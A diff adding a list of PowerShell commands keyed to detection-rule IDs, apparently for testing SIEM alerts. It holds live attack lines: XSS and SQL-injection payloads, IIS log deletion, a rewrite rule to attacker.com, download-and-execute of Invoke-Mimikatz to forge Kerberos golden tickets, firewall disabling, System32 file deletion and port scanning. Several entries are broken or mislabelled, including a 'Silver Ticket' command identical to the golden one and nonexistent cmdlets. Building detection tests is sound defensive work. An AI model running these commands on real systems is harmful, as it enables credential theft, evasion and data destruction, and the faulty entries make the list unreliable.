@@ -1,0 +1,90 @@
+1. QA_UBA
+powershell -Command "$event = New-Object System.Diagnostics.EventInstance(4624, 0, [System.Diagnostics.EventLogEntryType]::Information); $eventLog = New-Object System.Diagnostics.EventLog('Security'); $eventLog.Source = 'QA_UBA_Test'; $eventLog.WriteEvent($event, 'Test Event for QA_UBA: Account or Group or Privileges Modified'); Write-Host 'Test event created in Security log with EventID 4624'"
+
+2. QA_RC308_C134_E.R_A_WIN_Detect Forged Kerberos Ticket
+powershell -Command "$event = New-Object System.Diagnostics.EventInstance(4624, 0, [System.Diagnostics.EventLogEntryType]::Information); $eventLog = New-Object System.Diagnostics.EventLog('Security'); $eventLog.Source = 'QA_RC308_Test'; $eventLog.WriteEvent($event, 'A test event for detecting forged Kerberos ticket: The login user is not the actual user'); Write-Host 'Test event created in Security log with EventID 4624'"
+
+3. QA_RC308_C130_E.R_A_WAF_Cross Site Scripting Strings
+Invoke-WebRequest -Uri "http://example.com/page.php?name=<script>alert('XSS');</script>"
+4. QA_RC308_C131_E.R_A_WAF_SQL Injection Strings In URI
+Invoke-WebRequest -Uri "http://example.com/page.php?id=1'; DROP TABLE Users; --
+5. QA_RC308_C132_E.R_M_IIS_WebServer Access Logs Deleted
+Remove-Item -Path "C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log"
+6. QA_RC308_C119_E.R_A_IIS_Disable Windows IIS HTTP Logging
+Set-WebConfigurationProperty -PSPath 'MACHINE/WEBROOT/APPHOST' -Filter "system.applicationHost/sites/site[@name='Default Web Site']/logfile" -Name "logFormat" -Value "Custom"
+7. QA_RC308_C120_E.R_M_IIS_Suspicious IIS URL GlobalRules Rewrite Via AppCmd
+& $env:SystemRoot\system32\inetsrv\appcmd.exe set config "Default Web Site" -section:system.webServer/rewrite/globalRules /+"[name='SuspiciousRule',matchUrl='/test',action.type='Rewrite',action.url='http://attacker.com']"
+
+8. QA_RC308_C116_L.E.R_A_WIN_Potential SMB Relay Attack Tool Execution
+Invoke-Expression "python.exe C:\Path\to\smbrelayx.py -h"
+
+9. QA_RC308_C121_E.R_A_IIS_Suspicious IIS Module Registration
+New-WebHandler -Name "SuspiciousModule" -Path "*.aspx" -Module "SuspiciousModule.dll" -ScriptProcessor "C:\Path\to\SuspiciousModule.dll"
+
+10. QA_RC308_C122_E.R_A_WIN_Microsoft IIS Connection Strings Decryption
+aspnet_regiis -pdf "connectionStrings" C:\path\to\web.config
+
+11. QA_RC308_C117_E.R_M_WIN_HackTool - ADCSPwn Execution
+Invoke-Command -ComputerName DC01 -Credential (New-Object System.Management.Automation.PSCredential ("Administrator", (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force))) -ScriptBlock { <ADCSPwn-like commands here> }
+
+12. QA_RC308_C124_E.R_A_WIN_Request A Single Ticket via PowerShell
+Get-ADComputer -Filter {Name -eq "ComputerName"} | ForEach-Object { Get-ADComputer $_.Name -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName }
+
+13. QA_RC308_C125_E.R_M_WIN_Suspicious Kerberos RC4 Ticket Encryption
+New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain) | ForEach-Object { New-Object System.DirectoryServices.AccountManagement.UserPrincipal($_) } | ForEach-Object { $_.TestLocalPassword("P@ssw0rd") }
+
+14. QA_RC308_C129_E.R_A_LNX_Communication To Ngrok Tunneling Service
+Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://example.ngrok.io' -UseBasicParsing"
+
+15. QA_RC308_C133_E.R_A_WIN_Golden Ticket by HackTool
+Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cobbr/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"kerberos::golden /user:TargetUser /domain:example.com /sid:S-1-5-21-3623811015-3361044348-30300820 /rc4:6de4d9b4e684f00dc235f8647e35fa07 /service:cifs /target:example.com /ticket:ticket.kirbi"'
+
+16. QA_RC308_C135_E.R_A_WIN_Silver Ticket by HackTool
+Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cobbr/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"kerberos::golden /user:TargetUser /domain:example.com /sid:S-1-5-21-3623811015-3361044348-30300820 /rc4:6de4d9b4e684f00dc235f8647e35fa07 /service:cifs /target:example.com /ticket:ticket.kirbi"'
+
+17. QA_UBA: Possible TGT Forgery - Due
+Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cobbr/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-3623811015-3361044348-30300820 /rc4:6de4d9b4e684f00dc235f8647e35fa07 /service:krbtgt /target:example.com /ticket:ticket.kirbi"'
+
+18. QA_RC308_140_E.R_M_UBA_UBA : First Privilege Escalation
+Start-Process notepad.exe -Credential (Get-Credential)
+
+19. QA_RC309_C142_L.E.R_M_WIN_Suspicious DC Replication Request
+Repadmin /replicate "nome-do-seu-controlador-de-dominio" dc=<seu-dominio>,dc=com; Start-Sleep -Seconds 10
+
+20. QA_RC309_C142_L.E.R_M_WIN_Suspicious DC Replication Request - 2
+Invoke-WebRequest -Uri "http://<seu-controlador-de-dominio>/SYSVOL/" -UseBasicParsing
+
+21. QA_RC309_C144_E.R_M_WIN_Token Impersonation via PowerShell
+$token = Get-Process -Name explorer | Select-Object -ExpandProperty Token; Adjust-TokenPrivileges -Token $token -Privilege "SeDebugPrivilege" -Enable
+
+
+22. QA_Attempt to Disable Windows Firewall
+netsh advfirewall set currentprofile state off
+
+23. QA_Potential Windows Exploit via MSDT
+Start-Process -FilePath "msdt.exe"
+
+24. QA_Potential DLL Hijacking
+$code = '[DllImport(\kernel32.dll\")]`npublic static extern IntPtr LoadLibrary(string dllToLoad);`n`npublic static void Main(){`n    string dllPath = \"C:\\\\Path\\\\to\\\\malicious.dll\";`n    LoadLibrary(dllPath);`n}' | Out-File -FilePath C:\\malicious.cs -Encoding ASCII; Add-Type -TypeDefinition $code -Language CSharp; Start-Process -FilePath 'notepad.exe' -ArgumentList 'C:\\malicious.dll'"
+
+25. QA_Shortcut (lnk) File Executing Commands (Windows
+powershell -Command "$ShortcutPath='C:\Temp\malicious.lnk';$WshShell=New-Object -ComObject WScript.Shell;$Shortcut=$WshShell.CreateShortcut($ShortcutPath);$Shortcut.TargetPath='cmd.exe';$Shortcut.Arguments='/c calc.exe';$Shortcut.Save()"
+
+26. QA_Excessive Nslookup Usage on events
+1..10 | ForEach-Object { nslookup example.com }
+
+27. QA_Critical File Deleted
+Remove-Item -Path "C:\Windows\System32\critical_file.txt" -Force
+
+28. QA_Suspicious Valid Accounts Logon
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c net use \\target\IPC$ /user:username password' -Credential (Get-Credential)
+
+29. QA_Reconnaissance Tool Detected
+Start-Process -FilePath 'C:\Tools\masscan.exe' -ArgumentList '-p1-65535 192.168.1.1' -NoNewWindow
+
+30. QA_MOVEit Transfer Vulnerability Exploit Filenames
+New-Item -Path 'C:\Windows\Temp\human2.aspx', 'C:\Windows\Temp\human2.aspx.lnk', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\Root\<directory>\<file>.cmdline', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\Root\<directory>\a' -ItemType File -Force
+
+
+31. QA_RC309_C151_E.R_M_FW_Local L2L Scanner Detected
+Test-NetConnection -ComputerName localhost -Port 445 -InformationLevel Quiet -ErrorAction SilentlyContinue
